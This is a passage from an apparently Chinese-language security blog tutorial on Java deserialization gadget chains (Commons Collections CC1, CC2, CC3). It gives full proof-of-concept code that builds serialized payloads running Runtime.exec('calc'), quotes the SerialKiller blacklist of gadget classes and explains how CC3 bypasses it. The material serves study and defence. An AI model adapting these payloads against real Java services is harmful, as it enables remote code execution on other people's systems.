class="addition">+    private static class UnsafeAccessor &#123;</span></span><br><span class="line"><span class="addition">+        private static final sun.misc.Unsafe unsafe;</span></span><br><span class="line"><span class="addition">+        private static final long typeOffset;</span></span><br><span class="line"><span class="addition">+        private static final long memberValuesOffset;</span></span><br><span class="line"><span class="addition">+        static &#123;</span></span><br><span class="line"><span class="addition">+            try &#123;</span></span><br><span class="line"><span class="addition">+                unsafe = sun.misc.Unsafe.getUnsafe();</span></span><br><span class="line"><span class="addition">+                typeOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;type&quot;));</span></span><br><span class="line"><span class="addition">+                memberValuesOffset = unsafe.objectFieldOffset</span></span><br><span class="line"><span class="addition">+                        (AnnotationInvocationHandler.class.getDeclaredField(&quot;memberValues&quot;));</span></span><br><span class="line"><span class="addition">+            &#125; catch (Exception ex) &#123;</span></span><br><span class="line"><span class="addition">+                throw new ExceptionInInitializerError(ex);</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        static void setType(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                            Class&lt;? extends Annotation&gt; type) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, typeOffset, type);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        static void setMemberValues(AnnotationInvocationHandler o,</span></span><br><span class="line"><span class="addition">+                                    Map&lt;String, Object&gt; memberValues) &#123;</span></span><br><span class="line"><span class="addition">+            unsafe.putObject(o, memberValuesOffset, memberValues);</span></span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"><a href="#CommonsCollections1（AnnotationInvocationHandler→LazyMap）" class="headerlink" title="CommonsCollections1（AnnotationInvocationHandler→LazyMap）"></a>CommonsCollections1（AnnotationInvocationHandler→LazyMap）</h3><p>前面提到过，<code>LazyMap</code> 修饰过的 <code>Map</code> 只要调用 <code>get</code> 方法就会触发 <code>transform</code> 方法。然而 <code>AnnotationInvocationHandler.readObject</code> 并没有调用 <code>get</code> 方法。</p>
<p>不过幸运的是 <code>AnnotationInvocationHandler</code> 实现了 <code>InvocationHandler</code> 接口，本身是一个动态代理接口对象，也就是说只要我们把一个 <code>Map</code> 用 <code>AnnotationInvocationHandler</code> 代理，那么代理后的 <code>Map</code> 的任何方法调用都会执行到 <code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure></div>
<p><code>AnnotationInvocationHandler</code> 的 <code>invoke</code> 方法特判几种方法后会调用 <code>memberValues</code> 的 <code>get</code> 方法，也就会触发 <code>LazyMap</code> 的 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> toStringImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);  <span class="comment">// 调用 get 方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下，需要注意的是代理之后任何对 <code>proxyMap</code> 的操作都会触发 <code>transformer</code> 调用，因此需要最后设置恶意的 <code>Transformer</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy) 内层 AnnotationInvocationHandler 代理的 Map</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:42, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections2（PriorityQueue→TransformingComparator）"><a href="#CommonsCollections2（PriorityQueue→TransformingComparator）" class="headerlink" title="CommonsCollections2（PriorityQueue→TransformingComparator）"></a>CommonsCollections2（PriorityQueue→TransformingComparator）</h3><p>前面提到，<code>TransformingComparator</code> 在比较时会对比较的对象调用 <code>transform</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 Java 中内置的维护顺序的容器如 <code>PriorityQueue</code> 在反序列化时会对内部的元素进行排序，这个过程中在 <code>siftDownUsingComparator</code> 函数内涉及了元素大小的比较。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要在创建 <code>PriorityQueue</code> 容器时指定比较对象为我们定义的 <code>TransformingComparator</code>，之后往 <code>PriorityQueue</code> 中随便放两个元素，那么在反序列化时就会调用 <code>comparator.compare</code> 方法触发 <code>transform</code> 方法调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br></pre></td></tr></table></figure></div>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注意，类 <code>org.apache.commons.collections4.comparators.TransformingComparator</code>，在 commons-collections4.0 以前是版本中是没有实现 <code>Serializable</code> 接口的，无法在序列化中使用。</p>
<h3 id="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"><a href="#CommonsCollections3（…→TrAXFilter→InstantiateTransformer）" class="headerlink" title="CommonsCollections3（…→TrAXFilter→InstantiateTransformer）"></a>CommonsCollections3（…→TrAXFilter→InstantiateTransformer）</h3><p>2015 年初，@frohoff 和 @gebl 发布了 Talk《<a class="link"   href="https://frohoff.github.io/appseccali-marshalling-pickles/" >Marshalling Pickles: how deserializing objects will ruin your day <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>》，以及 Java 反序列化利用工具 ysoserial，随后引爆了安全界。开发者们自然会去找寻一种安全的过滤方法，于是类似 <a class="link"   href="https://github.com/ikkisoft/SerialKiller" >SerialKiller <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这样的工具随之诞生。</p>
<p>SerialKiller 是一个 Java 反序列化过滤器，可以通过黑名单与白名单的方式来限制反序列化时允许通过的类。在其发布的第一个版本代码中，我们可以看到其给出了最初的<a class="link"   href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf" >黑名单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- serialkiller.conf --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">refresh</span>&gt;</span>6000<span class="tag">&lt;/<span class="name">refresh</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">blacklist</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections1 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s CommonsCollections2 payload  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.apache\.commons\.collections4\.functors\.InvokerTransformer$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Groovy payload  --&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.ConvertedClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.codehaus\.groovy\.runtime\.MethodClosure$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">	<span class="comment">&lt;!-- ysoserial&#x27;s Spring1 payload  --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">regexp</span>&gt;</span>^org\.springframework\.beans\.factory\.ObjectFactory$<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">blacklist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">whitelist</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">regexp</span>&gt;</span>.*<span class="tag">&lt;/<span class="name">regexp</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这个黑名单中 <code>InvokerTransformer</code> 赫然在列，也就切断了 <code>CommonsCollections1</code> 的利⽤链。有攻就有防，ysoserial 随后增加了不少新的 Gadgets，其中就包括 CommonsCollections3。</p>
<p>CommonsCollections3 的目的很明显，就是为了绕过一些规则对 <code>InvokerTransformer</code> 的限制。CommonsCollections3 并没有使用到 <code>InvokerTransformer</code> 来调用任意方法，而是用到了另一个类，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p>
<p>这个类的构造方法中调用了 <code>(TransformerImpl) templates.newTransformer()</code> ，免去了我们使用 <code>InvokerTransformer</code> 手工调用 <code>newTransformer()</code> 方法这一步：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">    TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer(); <span class="comment">// &lt;---</span></span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们可以构造如下 <code>ChainedTransformer</code>：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>poc 如下，这个是基于 CC1 的 <code>LazyMap</code> 链，其实这里可以自由组合其他的链，只要能调用到 <code>transform</code> 方法即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> 